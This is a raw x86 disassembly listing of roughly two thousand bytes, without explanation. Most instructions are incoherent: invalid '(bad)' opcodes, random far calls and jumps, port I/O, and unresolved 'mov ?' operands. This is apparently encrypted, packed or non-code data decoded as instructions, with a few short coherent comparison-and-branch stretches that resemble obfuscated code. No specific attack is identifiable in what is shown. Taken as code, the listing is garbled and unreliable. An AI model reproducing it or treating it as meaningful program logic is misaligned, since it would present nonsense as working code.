  404197:	fnstenv [esp+esi*2-0x7da240ec]
  40419e:	inc    ecx
  40419f:	lds    esp,FWORD PTR [eax+0x75]
  4041a2:	clc    
  4041a3:	adc    ah,BYTE PTR [ebx+0x6367d853]
  4041a9:	dec    eax
  4041aa:	mov    ?,WORD PTR [edx-0x2a]
  4041ad:	and    eax,0xdb6643f3
  4041b2:	mov    ecx,0xa0fd7d47
  4041b7:	push   0xffffffa7
  4041b9:	shl    bh,1
  4041bb:	sbb    al,0xb6
  4041bd:	adc    eax,0x695d95f8
  4041c2:	sub    dl,ah
  4041c4:	call   0x9bd3254f
  4041c9:	ror    DWORD PTR [edi+0x2a988c6b],cl
  4041cf:	out    0x58,eax
  4041d1:	(bad)  
  4041d2:	mov    ebp,0x6b68f7a1
  4041d7:	imul   ebx,DWORD PTR [ecx-0x64b628bc],0x3274ec1
  4041e1:	mov    dl,BYTE PTR [ebp-0x2e]
  4041e4:	jmp    0x5ceec005
  4041e9:	fistp  QWORD PTR [edx+0xea4ca30]
  4041ef:	fadd   st,st(5)
  4041f1:	mov    dh,0xee
  4041f3:	sbb    bl,BYTE PTR [esi+ebp*2]
  4041f6:	test   DWORD PTR [esi-0x2f],ecx
  4041f9:	jne    0x4041d8
  4041fb:	push   ebx
  4041fc:	mov    eax,0x38832102
  404201:	pop    esi
  404202:	add    cl,BYTE PTR [esp+edi*1]
  404205:	mov    cl,0xa7
  404207:	pop    eax
  404208:	push   es
  404209:	test   eax,0x601651c4
  40420e:	lods   eax,DWORD PTR gs:[esi]
  404210:	inc    esp
  404211:	sar    BYTE PTR [ebx+0x7a],0x26
  404215:	and    eax,0x6e5c2c96
  40421a:	and    DWORD PTR [eax+0x6b34d468],eax
  404220:	das    
  404221:	arpl   WORD PTR [edi-0x76321bce],di
  404227:	std    
  404228:	mov    ds:0xc67c379e,al
  40422d:	sub    cl,BYTE PTR [ecx-0x53]
  404230:	call   0xdea8:0xa537f073
  404237:	mov    ch,0x7d
  404239:	test   DWORD PTR [ebp*1+0x2492584e],0xe5a3264a
  404244:	xor    esi,DWORD PTR [edx-0x16]
  404247:	fist   DWORD PTR [ebx-0x6f]
  40424a:	rcr    DWORD PTR [edx+ebp*4],cl
  40424d:	mov    ebp,0x2607e886
  404252:	nop
  404253:	jns    0x4042c7
  404255:	adc    edx,DWORD PTR [ecx+edx*4]
  404258:	(bad)  
  404259:	mov    esi,0xa6913afa
  40425e:	pop    es
  40425f:	push   ds
  404260:	into   
  404261:	call   0x98e4:0x5ed1b35e
  404268:	cmp    BYTE PTR [ebx-0x54],0x24
  40426c:	push   ds
  40426d:	jg     0x40423d
  40426f:	loope  0x4042b1
  404271:	sub    al,0x60
  404273:	out    0xa4,eax
  404275:	mov    cl,0xd7
  404277:	retf   
  404278:	icebp  
  404279:	mov    BYTE PTR [edi-0x49792ec5],ah
  40427f:	sbb    eax,0x467a798e
  404284:	arpl   WORD PTR [esi-0x71ab3be3],bp
  40428a:	lods   eax,DWORD PTR ds:[esi]
  40428b:	fld    QWORD PTR [edi-0x38e6d864]
  404291:	push   edx
  404292:	fcomip st,st(5)
  404294:	cmc    
  404295:	or     BYTE PTR [ebx+0x5da75c11],0x6a
  40429c:	push   eax
  40429d:	loopne 0x40424f
  40429f:	push   0xe1bda493
  4042a4:	mov    ah,0x27
  4042a6:	scas   al,BYTE PTR es:[edi]
  4042a7:	cmp    edi,DWORD PTR [si-0x70]
  4042ab:	dec    ebx
  4042ac:	push   cs
  4042ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042ae:	jl     0x404238
  4042b0:	pop    ebx
  4042b1:	shr    edx,0x83
  4042b4:	mov    DWORD PTR [ebx-0x3f],edi
  4042b7:	test   BYTE PTR [edx+0x37],cl
  4042ba:	outs   dx,BYTE PTR ds:[esi]
  4042bb:	imul   edx,DWORD PTR [ebp+0xe880f3f],0xffffffa1
  4042c2:	imul   al
  4042c4:	bound  esi,QWORD PTR [ebp-0x2739457f]
  4042ca:	sbb    al,0x66
  4042cc:	popa   
  4042cd:	clc    
  4042ce:	sbb    BYTE PTR [edi],bl
  4042d0:	push   cs
  4042d1:	clc    
  4042d2:	int    0x33
  4042d4:	mov    esi,0x40caed40
  4042d9:	in     eax,dx
  4042da:	dec    esp
  4042db:	inc    esi
  4042dc:	ret    
  4042dd:	push   eax
  4042de:	jno    0x404312
  4042e0:	cwde   
  4042e1:	dec    edx
  4042e2:	cs sub ecx,esp
  4042e5:	fisttp QWORD PTR gs:[ecx]
  4042e8:	adc    bh,BYTE PTR [ebx-0x1f3cc20c]
  4042ee:	or     al,0x98
  4042f0:	adc    al,0x2e
  4042f2:	fdivr  DWORD PTR [edx]
  4042f4:	pop    esp
  4042f5:	lea    eax,[edi+0x209d576a]
  4042fb:	and    eax,0x7fd969e6
  404300:	int    0x78
  404302:	cdq    
  404303:	mov    cs,WORD PTR [eax-0x7a51b6a6]
  404309:	jge    0x40435d
  40430b:	in     al,dx
  40430c:	stos   BYTE PTR es:[edi],al
  40430d:	add    al,0x12
  40430f:	lock mov al,ds:0xff3bb4ad
  404315:	pop    ebp
  404316:	dec    ecx
  404317:	iret   
  404318:	xchg   edi,eax
  404319:	bound  edi,QWORD PTR [eax]
  40431b:	adc    esi,ebx
  40431d:	retf   
  40431e:	pushf  
  40431f:	push   ecx
  404320:	daa    
  404321:	jp     0x4042a5
  404323:	xlat   BYTE PTR ds:[ebx]
  404324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404325:	sbb    eax,0x5aa65171
  40432a:	and    al,BYTE PTR [esi+0x67]
  40432d:	and    eax,0x9f51de3b
  404332:	fmul   DWORD PTR [edx+eiz*8]
  404335:	push   eax
  404336:	es inc edi
  404338:	imul   esi,DWORD PTR [edx+0x79],0xe87d9ed6
  40433f:	push   ebp
  404340:	mov    esi,0xbb6aaa27
  404345:	jl     0x40438c
  404347:	(bad)  
  404348:	retf   
  404349:	aad    0x91
  40434b:	cmc    
  40434c:	shr    BYTE PTR [ecx],1
  40434e:	dec    esi
  40434f:	inc    esp
  404350:	test   BYTE PTR [ecx+edi*2-0x5b],al
  404354:	pop    ebp
  404355:	xor    DWORD PTR [esi-0x39],0xba04ef14
  40435c:	gs pop edx
  40435e:	sbb    BYTE PTR [eax+0x1e9a96ee],al
  404364:	mov    ecx,0x3048d0cc
  404369:	xchg   edx,eax
  40436a:	adc    eax,0x12f16e62
  40436f:	out    dx,al
  404370:	mov    eax,ds:0x4ba9d44
  404375:	pop    ss
  404376:	out    dx,al
  404377:	and    ecx,DWORD PTR [edi+eiz*1]
  40437a:	dec    ecx
  40437b:	add    dh,BYTE PTR [ebx-0x45]
  40437e:	loopne 0x404341
  404380:	(bad)  
  404382:	sbb    eax,DWORD PTR [edx+0x40bdf4c4]
  404388:	push   edx
  404389:	mov    ah,0x57
  40438b:	sub    al,0x5
  40438d:	xchg   ebx,eax
  40438e:	jb     0x4043ed
  404390:	ins    DWORD PTR es:[edi],dx
  404391:	mov    edx,0x98f439fb
  404396:	pop    edi
  404397:	adc    esi,edx
  404399:	cs enter 0xd0ec,0x1d
  40439e:	jae    0x4043fb
  4043a0:	fnsave [edi]
  4043a2:	and    ah,dl
  4043a4:	pop    ds
  4043a5:	xor    eax,0x5773093
  4043aa:	adc    edx,DWORD PTR [eax+0x52c7e49a]
  4043b0:	mov    al,0xad
  4043b2:	or     edx,DWORD PTR [ebp+0x4c600d5d]
  4043b8:	cli    
  4043b9:	cmp    eax,DWORD PTR [ecx]
  4043bb:	xchg   DWORD PTR ds:0x50bc8a2c,edx
  4043c1:	pusha  
  4043c2:	cmp    eax,0xf4f6062c
  4043c7:	lods   eax,DWORD PTR ds:[esi]
  4043c8:	jge    0x40440a
  4043ca:	dec    edi
  4043cb:	dec    eax
  4043cc:	pop    ebp
  4043cd:	mov    ah,0xd6
  4043cf:	sbb    BYTE PTR [ebx],bl
  4043d1:	rcpps  xmm6,XMMWORD PTR [edx+0x3f599ec8]
  4043d8:	data16 jns 0x404428
  4043db:	inc    edx
  4043dc:	jmp    DWORD PTR [ebx]
  4043de:	(bad)  [edi+0x2e]
  4043e1:	jo     0x404388
  4043e3:	leave  
  4043e4:	cmp    al,0x92
  4043e6:	ror    BYTE PTR [ebp+0x74],1
  4043e9:	pop    eax
  4043ea:	fcom   DWORD PTR [esi+ecx*8]
  4043ed:	add    eax,0xed0636df
  4043f2:	xor    DWORD PTR [edi+0x65],edx
  4043f5:	mov    BYTE PTR [eax],cl
  4043f7:	adc    DWORD PTR [ecx-0x5a],ebx
  4043fa:	in     eax,0x2d
  4043fc:	mov    ecx,0xdc4c1a63
  404401:	data16 hlt 
  404403:	icebp  
  404404:	jge    0x40447a
  404406:	mov    ah,0x81
  404408:	mov    ds:0x59b3c6f3,al
  40440d:	pop    ebp
  40440e:	scas   al,BYTE PTR es:[edi]
  40440f:	into   
  404410:	test   dh,0x65
  404413:	sub    eax,0x2bcdc6e4
  404418:	std    
  404419:	in     eax,0x5f
  40441b:	clc    
  40441c:	cmp    DWORD PTR [edi-0xffc245b],esi
  404422:	jnp    0x404484
  404424:	aad    0x8d
  404426:	outs   dx,BYTE PTR ds:[esi]
  404427:	pop    ss
  404428:	adc    BYTE PTR [ecx-0x3e],bl
  40442b:	dec    BYTE PTR [esi]
  40442d:	stos   BYTE PTR es:[edi],al
  40442e:	aam    0x6d
  404430:	inc    esp
  404431:	jp     0x4043e2
  404433:	xor    al,0x16
  404435:	pusha  
  404436:	or     al,0xb1
  404438:	pusha  
  404439:	mov    ecx,0x88aba1bc
  40443e:	pop    edi
  40443f:	aas    
  404440:	lods   eax,DWORD PTR ds:[esi]
  404441:	fwait
  404442:	xor    eax,0x7764e285
  404447:	pop    ss
  404448:	and    eax,0x6250d0c1
  40444d:	xor    eax,0x5b56fe5b
  404452:	jp     0x4044ae
  404454:	inc    ebp
  404455:	stos   DWORD PTR es:[edi],eax
  404456:	outs   dx,DWORD PTR ds:[esi]
  404457:	jecxz  0x404446
  404459:	xchg   edi,eax
  40445a:	jo     0x4044c7
  40445c:	xor    DWORD PTR ds:0xee3202b8,esi
  404462:	mov    ecx,0x9d811e30
  404467:	inc    ebp
  404468:	and    eax,0x78c9da2d
  40446d:	push   esi
  40446e:	fcomi  st,st(3)
  404470:	sub    DWORD PTR [esi+0x376531db],eax
  404476:	loopne 0x404475
  404478:	lods   al,BYTE PTR ds:[esi]
  404479:	ja     0x404441
  40447b:	lds    ecx,FWORD PTR [esp+edx*2+0x76660201]
  404482:	sub    eax,0x2d276fd2
  404487:	les    edx,FWORD PTR [edi+edi*8+0x3b93ee95]
  40448e:	(bad)  
  40448f:	xchg   edx,eax
  404490:	loope  0x4044a2
  404492:	xor    dl,BYTE PTR [eax]
  404494:	mov    ds:0x3e67162d,eax
  404499:	xchg   ebp,edi
  40449b:	scas   eax,DWORD PTR es:[edi]
  40449c:	push   ss
  40449d:	cmp    al,0xe4
  40449f:	add    bh,bh
  4044a1:	push   ecx
  4044a2:	call   0xad20ed8c
  4044a7:	sahf   
  4044a8:	loope  0x4044d3
  4044aa:	xor    ah,dl
  4044ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ad:	in     eax,dx
  4044ae:	retf   0x8c64
  4044b1:	call   0xa8144661
  4044b6:	in     al,0xb5
  4044b8:	fmul   DWORD PTR [eax-0x49]
  4044bb:	jb     0x40447e
  4044bd:	pop    edi
  4044be:	fcmovne st,st(0)
  4044c0:	dec    edx
  4044c1:	in     eax,0x71
  4044c3:	(bad)  
  4044c5:	ins    BYTE PTR es:[edi],dx
  4044c6:	pop    ebx
  4044c7:	out    dx,eax
  4044c8:	push   ds
  4044c9:	push   eax
  4044ca:	int3   
  4044cb:	or     eax,0xd3efa49e
  4044d0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044d4:	mov    dl,BYTE PTR [ebp-0x1]
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	pop    ebx
  40450c:	or     al,0xcc
  40450e:	cdq    
  40450f:	jmp    0x404538
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x404572
  404518:	mov    dh,0x8c
  40451a:	(bad)  
  40451b:	jnp    0x404545
  40451d:	mov    esp,0xdf376c2d
  404522:	scas   eax,DWORD PTR es:[edi]
  404523:	aad    0xe4
  404525:	xor    eax,0x6649eadc
  40452a:	cli    
  40452b:	clc    
  40452c:	inc    edx
  40452d:	inc    esi
  40452e:	push   ebp
  40452f:	test   al,0x4c
  404531:	mov    esp,0xb2131448
  404536:	sub    esi,DWORD PTR [ebp+0x24]
  404539:	cmp    eax,0x4d559db5
  40453e:	cld    
  40453f:	push   0x5b
  404541:	cmp    BYTE PTR [ecx],bl
  404543:	out    0x40,al
  404545:	out    dx,al
  404546:	mov    edx,0xefbb016c
  40454b:	inc    esp
  40454c:	and    BYTE PTR [ebp-0x763f05c0],bl
  404552:	push   0x68c2caa
  404557:	or     DWORD PTR ds:0x9c01805c,eax
  40455d:	jmp    0x4045a1
  40455f:	cmp    eax,0x147d9108
  404564:	mov    dh,0xf4
  404566:	cwde   
  404567:	lea    edi,[esi-0x66]
  40456a:	sub    bh,BYTE PTR [ebx-0x6c]
  40456d:	sbb    BYTE PTR [eax],ah
  40456f:	jmp    0x513b:0x3e2cce71
  404576:	cmp    eax,0xc60b7f3d
  40457b:	mov    al,ds:0xcad8ded3
  404580:	xor    al,0x9b
  404582:	pop    ebx
  404583:	push   edi
  404584:	xor    eax,0x45fe6ed8
  404589:	mov    dl,0xe9
  40458b:	into   
  40458c:	div    BYTE PTR [edx]
  40458e:	fdiv   QWORD PTR [edi+0x2b4d6b5d]
  404594:	imul   edi,DWORD PTR [ebx],0x11e8e090
  40459a:	int    0xb
  40459c:	sbb    DWORD PTR [edi+0x736a3099],eax
  4045a2:	loopne 0x404606
  4045a4:	push   eax
  4045a5:	rol    dh,1
  4045a7:	sahf   
  4045a8:	cmp    eax,0x2d6d2564
  4045ad:	lahf   
  4045ae:	cs repnz mov ch,0x9e
  4045b2:	fdivr  QWORD PTR [edx+eiz*8+0x3c788121]
  4045b9:	rcr    DWORD PTR [eax-0x1a],0x84
  4045bd:	(bad)  
  4045be:	lock adc ah,BYTE PTR [edi+0x76]
  4045c2:	fadd   DWORD PTR [ebp-0x56385047]
  4045c8:	pop    ebp
  4045c9:	call   0xec60:0x45e1b025
  4045d0:	leave  
  4045d1:	retf   
  4045d2:	mov    cl,0x5f
  4045d4:	and    eax,0x8f518687
  4045d9:	fstp   st(3)
  4045db:	adc    DWORD PTR [esi*8-0x6d4d4b46],edi
  4045e2:	or     al,0x6d
  4045e4:	fsubr  st,st(4)
  4045e6:	imul   ebp,DWORD PTR [edx],0x6d44f3f0
  4045ec:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4045ee:	into   
  4045ef:	mov    eax,0x62652fae
  4045f4:	pushf  
  4045f5:	inc    edi
  4045f6:	add    BYTE PTR [edx+0x776932c],dl
  4045fc:	xor    DWORD PTR [esi+0x52],0xffffffc3
  404600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404601:	push   edx
  404602:	stos   DWORD PTR es:[edi],eax
  404603:	rcr    esp,1
  404605:	jge    0x40464d
  404607:	les    esi,FWORD PTR [ecx-0x10]
  40460a:	das    
  40460b:	or     bh,ch
  40460d:	std    
  40460e:	jg     0x4045a5
  404610:	cdq    
  404611:	xchg   ebp,ecx
  404613:	push   es
  404614:	fidivr WORD PTR [ecx+eax*8-0x3f]
  404618:	jnp    0x4045cb
  40461a:	lods   eax,DWORD PTR ds:[esi]
  40461b:	in     al,dx
  40461c:	fwait
  40461d:	mov    DWORD PTR [edx],edi
  40461f:	loope  0x404698
  404621:	enter  0x65d9,0x78
  404625:	(bad)  
  404626:	cmp    BYTE PTR [ecx+0x62c103e6],ch
  40462c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40462d:	add    ebx,DWORD PTR [edi-0xc]
  404630:	fwait
  404631:	sbb    BYTE PTR [ecx-0x3d],bh
  404634:	out    0x5e,al
  404636:	mov    eax,DWORD PTR ds:0x7484b9eb
  40463c:	rol    DWORD PTR [esi],1
  40463e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40463f:	jle    0x4046b2
  404641:	mov    dh,0x16
  404643:	sbb    dh,BYTE PTR [esi]
  404645:	popa   
  404646:	mov    BYTE PTR [ecx],bh
  404648:	mov    bh,0x98
  40464a:	mov    al,ds:0xf877402e
  40464f:	jb     0x404625
  404651:	enter  0x4c7c,0x73
  404655:	call   FWORD PTR [eax+0xb]
  404658:	fcomp  QWORD PTR [edx-0x20]
  40465b:	jge    0x4045f1
  40465d:	stc    
  40465e:	xlat   BYTE PTR ds:[ebx]
  40465f:	mov    esp,cs
  404661:	lock mov ch,ah
  404664:	xchg   esi,eax
  404665:	into   
  404666:	mov    DWORD PTR [esi],esi
  404668:	lods   eax,DWORD PTR ds:[esi]
  404669:	(bad)  
  40466a:	lods   al,BYTE PTR ds:[esi]
  40466b:	mov    al,ds:0xf54c2abe
  404670:	sbb    BYTE PTR [edx+0x3b7e7bcf],bh
  404676:	lods   eax,DWORD PTR ds:[esi]
  404677:	xor    cl,BYTE PTR [ebx]
  404679:	push   esp
  40467a:	dec    ecx
  40467b:	int    0xad
  40467d:	in     al,dx
  40467e:	sbb    edx,edx
  404680:	dec    esi
  404681:	mov    esi,DWORD PTR [edi-0x30]
  404684:	push   ds
  404685:	js     0x404695
  404687:	push   edx
  404688:	push   ds
  404689:	xchg   ebx,eax
  40468a:	bound  eax,QWORD PTR [ecx-0x37]
  40468d:	scas   al,BYTE PTR es:[edi]
  40468e:	cmc    
  40468f:	add    ah,BYTE PTR [ecx+edx*2+0x27c553b2]
  404696:	lods   al,BYTE PTR ds:[esi]
  404697:	push   ecx
  404698:	mov    al,0xd5
  40469a:	xor    al,0xec
  40469c:	icebp  
  40469d:	xchg   BYTE PTR [ecx-0x62],bl
  4046a0:	and    BYTE PTR [eax-0x55c4dffa],dl
  4046a6:	sahf   
  4046a7:	scas   al,BYTE PTR es:[edi]
  4046a8:	mov    edi,cs
  4046aa:	inc    ebx
  4046ab:	in     eax,0xbe
  4046ad:	out    dx,eax
  4046ae:	cdq    
  4046af:	sub    DWORD PTR [edx+ecx*4+0x6a],esp
  4046b3:	ja     0x40465e
  4046b5:	or     eax,0xf16aeab9
  4046ba:	stos   BYTE PTR es:[edi],al
  4046bb:	(bad)  
  4046bc:	jge    0x4046c4
  4046be:	push   ebp
  4046bf:	loop   0x4046a9
  4046c1:	xchg   esp,eax
  4046c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046c3:	lods   al,BYTE PTR ds:[esi]
  4046c4:	ficomp WORD PTR [eax]
  4046c6:	cmp    BYTE PTR [esi],dl
  4046c8:	jae    0x404696
  4046ca:	mov    edi,0xf6b454dc
  4046cf:	fst    QWORD PTR [ecx]
  4046d1:	call   0xc7e4:0xfb1438fe
  4046d8:	mov    dl,0xc0
  4046da:	xor    DWORD PTR [ebx+0xe86d66c],ecx
  4046e0:	aam    0x14
  4046e2:	dec    ebx
  4046e3:	arpl   WORD PTR [ebp-0x41bdb0dc],si
  4046e9:	xor    DWORD PTR [edx],ecx
  4046eb:	(bad)  
  4046ec:	ror    DWORD PTR [eax+0x648ee7],1
  4046f2:	dec    ebx
  4046f3:	mov    ebx,0x7536f706
  4046f8:	and    ebp,ebx
  4046fa:	xor    eax,0x86609ecc
  4046ff:	and    al,0xfa
  404701:	(bad)  
  404702:	sub    cl,BYTE PTR [eax]
  404704:	lea    edi,[edi]
  404706:	and    DWORD PTR [esi],eax
  404708:	sahf   
  404709:	scas   eax,DWORD PTR es:[edi]
  40470a:	sbb    DWORD PTR ds:0x5f7c3e94,esi
  404710:	gs cs hlt 
  404713:	not    DWORD PTR [esi]
  404715:	(bad)  
  404716:	cwde   
  404717:	jnp    0x40471d
  404719:	fwait
  40471a:	pop    ds
  40471b:	pusha  
  40471c:	sbb    BYTE PTR [eax+eiz*8-0x59ab8432],0x2e
  404724:	cmp    BYTE PTR [eax+0x60],dh
  404727:	jg     0x40476c
  404729:	cwde   
  40472a:	sbb    ch,BYTE PTR [ebx]
  40472c:	add    eax,esi
  40472e:	xchg   esp,eax
  40472f:	and    eax,0x77717022
  404734:	sbb    eax,0x1fe8af6e
  404739:	popf   
  40473a:	jb     0x4046ed
  40473c:	add    al,0x61
  40473e:	fsub   DWORD PTR [eax+esi*1-0x5c]
  404742:	into   
  404743:	dec    ecx
  404744:	clc    
  404745:	pop    edx
  404746:	outs   dx,BYTE PTR ds:[esi]
  404747:	(bad)  
  404748:	stc    
  404749:	fwait
  40474a:	mov    esi,0xe5314774
  40474f:	push   0xffffffed
  404751:	(bad)  
  404752:	mov    edi,0xb126e85a
  404757:	mov    ebx,0x2f3e930d
  40475c:	jne    0x40478d
  40475e:	mov    eax,0xe50e846a
  404763:	sbb    al,ch
  404765:	out    0x81,al
  404767:	dec    esi
  404768:	xchg   esi,eax
  404769:	clc    
  40476a:	mov    ebp,0x62ab2d70
  40476f:	cwde   
  404770:	cmp    DWORD PTR [esi-0x4bbcc89b],0x96cb69dc
  40477a:	js     0x4047e9
  40477c:	popa   
  40477d:	(bad)
  404780:	fucomip st,st(3)
  404782:	jne    0x40470a
  404784:	adc    DWORD PTR ss:[ecx+0x52f44b75],0xa
  40478c:	add    DWORD PTR [ecx],edi
  40478e:	or     al,0xc3
  404790:	inc    eax
  404791:	inc    ecx
  404792:	or     eax,0x1047d865
  404797:	dec    ebx
  404798:	add    ch,ch
  40479a:	mov    dl,BYTE PTR [ecx+0x56]
  40479d:	sbb    dl,BYTE PTR [ecx-0x12]
  4047a0:	jle    0x404732
  4047a2:	clc    
  4047a3:	sbb    ch,bl
  4047a5:	jo     0x40475d
  4047a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047a8:	adc    al,0x41
  4047aa:	cmp    DWORD PTR [edx],eax
  4047ac:	inc    ecx
  4047ad:	rol    BYTE PTR ss:[eax-0x3da5541c],0x10
  4047b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047b6:	(bad)  
  4047b7:	cmp    al,dl
  4047b9:	sbb    ah,0x9f
  4047bc:	pop    ebx
  4047bd:	xor    al,dh
  4047bf:	dec    esi
  4047c0:	mov    edi,0x6f6d2ba4
  4047c5:	repnz mov eax,0x6da5e776
  4047cb:	inc    eax
  4047cc:	dec    edx
  4047cd:	test   DWORD PTR [eax-0x26175106],ecx
  4047d3:	xor    al,0x9c
  4047d5:	out    dx,eax
  4047d6:	pop    esp
  4047d7:	jle    0x404856
  4047d9:	mov    ?,WORD PTR [edi-0x54830415]
  4047df:	add    DWORD PTR [edx-0x1e0702db],ebp
  4047e5:	jb     0x4047bf
  4047e7:	xlat   BYTE PTR ds:[ebx]
  4047e8:	inc    ecx
  4047e9:	(bad)  
  4047ea:	xor    al,0xe0
  4047ec:	push   es
  4047ed:	xchg   esi,eax
  4047ee:	shl    DWORD PTR [ecx],cl
  4047f0:	lahf   
  4047f1:	mov    dh,0xa1
  4047f3:	stos   DWORD PTR es:[edi],eax
  4047f4:	les    esp,FWORD PTR [edi+0x1c]
  4047f7:	lods   al,BYTE PTR ds:[esi]
  4047f8:	call   0xda57:0x9d4a97c
  4047ff:	push   cs
  404800:	push   0xffffffa6
  404802:	cmp    BYTE PTR ds:0xe8de94da,0xd1
  404809:	mov    dh,0x3b
  40480b:	mov    ebp,0xca027154
  404810:	aad    0x86
  404812:	test   eax,0x81b80ba4
  404817:	outs   dx,BYTE PTR ds:[esi]
  404818:	mov    WORD PTR [eax],es
  40481a:	jb     0x40486e
  40481c:	pop    ebx
  40481d:	push   eax
  40481e:	sbb    edi,DWORD PTR [edx]
  404820:	shl    ch,1
  404822:	dec    edx
  404823:	imul   ecx,DWORD PTR [esp+eax*1-0x2b634d81],0xffffffa3
  40482b:	jge    0x4047d1
  40482d:	adc    DWORD PTR [edi-0x2d],edx
  404830:	test   DWORD PTR [ecx-0x43],edx
  404833:	div    DWORD PTR cs:[ebp+0x24afc29]
  40483a:	push   ecx
  40483b:	fisubr DWORD PTR [edi]
  40483d:	cmp    esp,DWORD PTR [eax-0x87434ce]
  404843:	ret    
  404844:	adc    al,cl
  404846:	mov    DWORD PTR [edi+0x3a],ebp
  404849:	mov    ebx,0x976371bf
  40484e:	push   ss
  40484f:	daa    
  404850:	in     al,dx
  404851:	xchg   ecx,eax
  404852:	sub    DWORD PTR [edx-0x2127b987],eax
  404858:	or     bh,bh
  40485a:	push   esp
  40485b:	ja     0x40486e
  40485d:	and    edx,esp
  40485f:	mov    ?,WORD PTR [ebp+0x1bcddcfa]
  404865:	std    
  404866:	or     eax,0x2dffd6cc
  40486b:	ds push cs
  40486d:	aad    0x9f
  40486f:	jns    0x4048dd
  404871:	into   
  404872:	fistp  DWORD PTR [ecx+0x5d]
  404875:	add    dh,BYTE PTR [ebx+0x3c]
  404878:	fcmovu st,st(6)
  40487a:	out    dx,eax
  40487b:	lods   al,BYTE PTR ds:[esi]
  40487c:	mov    dh,0xce
  40487e:	cwde   
  40487f:	loop   0x40486c
  404881:	jne    0x4048e4
  404883:	cmp    DWORD PTR [ecx-0x7df7e69e],ebx
  404889:	hlt    
  40488a:	xchg   BYTE PTR [ebx+0x74],dh
  40488d:	sti    
  40488e:	jp     0x404888
  404890:	jmp    0xe298:0xc2d9f6c9
  404897:	hlt    
  404898:	mov    esi,0x9d6b492e
  40489d:	scas   al,BYTE PTR es:[edi]
  40489e:	dec    esi
  40489f:	inc    edi
  4048a0:	clc    
  4048a1:	mov    al,0xdc
  4048a3:	pop    esi
  4048a4:	rcr    ebp,cl
  4048a6:	xchg   esi,eax
  4048a7:	ss test eax,0xc41c6f93
  4048ad:	mov    DWORD PTR cs:[ebp+0x55],edx
  4048b1:	ror    DWORD PTR [eax-0x2cef6984],1
  4048b7:	and    eax,DWORD PTR [ebp-0x4]
  4048ba:	je     0x404869
  4048bc:	enter  0xa55d,0x61
  4048c0:	out    dx,eax
  4048c1:	call   0x42f3:0x1644d6b7
  4048c8:	adc    dl,dl
  4048ca:	ret    
  4048cb:	cs jmp 0xaf624a5b
  4048d1:	test   al,cl
  4048d3:	xor    dl,BYTE PTR [ebx+0x2a8d71ce]
  4048d9:	scas   eax,DWORD PTR es:[edi]
  4048da:	leave  
  4048db:	pop    edx
  4048dc:	test   ch,bh
  4048de:	test   BYTE PTR [esi+0x71],dh
  4048e1:	xchg   esi,eax
  4048e3:	mov    esp,ebx
  4048e5:	jmp    0x692fc18
  4048ea:	or     eax,0x382cc2ce
  4048ef:	xor    eax,ecx
  4048f1:	add    eax,esi
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	xchg   esp,ebp
  40491b:	loopne 0x404914
  40491d:	ret    
  40491e:	and    edi,DWORD PTR [esi+0x7e]
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x40492c
  404926:	es (bad) 
  404928:	xchg   edx,eax
  404929:	mov    dh,0xef
  40492b:	xchg   esp,eax
  40492c:	cmp    dl,BYTE PTR [edx]
  40492e:	mov    ah,0xe
  404930:	call   0x45b4:0x216ac71c
  404937:	test   DWORD PTR [edi+0x20],ebp
  40493a:	outs   dx,BYTE PTR ds:[esi]
  40493b:	mov    ebp,0xfc455cef
  404940:	mov    esp,0x343886fd
  404945:	jne    0x404988
  404947:	xlat   BYTE PTR ds:[ebx]
  404948:	inc    esi
  404949:	loop   0x4049a7
  40494b:	in     eax,dx
  40494c:	ret    
  40494d:	lahf   
  40494e:	or     bl,ah
  404950:	(bad)  
  404951:	xor    BYTE PTR [edi+esi*1-0x4f88d233],al
  404958:	rcl    BYTE PTR [eax+0x5d],cl
  40495b:	jmp    0xeef775d2
  404960:	xchg   ecx,eax
  404961:	sub    DWORD PTR [eax+0x1b],edi
  404964:	pop    edi
  404965:	sub    ch,BYTE PTR [ecx-0x5e96c18e]
  40496b:	scas   al,BYTE PTR es:[edi]
  40496c:	ins    BYTE PTR es:[edi],dx
  40496d:	xchg   esi,eax
  40496e:	jg     0x404930
  404970:	std    
  404971:	lods   eax,DWORD PTR ds:[esi]
  404972:	hlt    
  404973:	cwde   
  404974:	sbb    dh,0x54
  404977:	clc    
  404978:	sahf   
  404979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40497a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40497b:	and    DWORD PTR [ebx+0x43],0x77
  40497f:	pop    es
  404980:	inc    DWORD PTR [ecx]
  404982:	sub    bh,bl
  404984:	push   eax
  404985:	stos   BYTE PTR es:[edi],al
  404986:	push   es
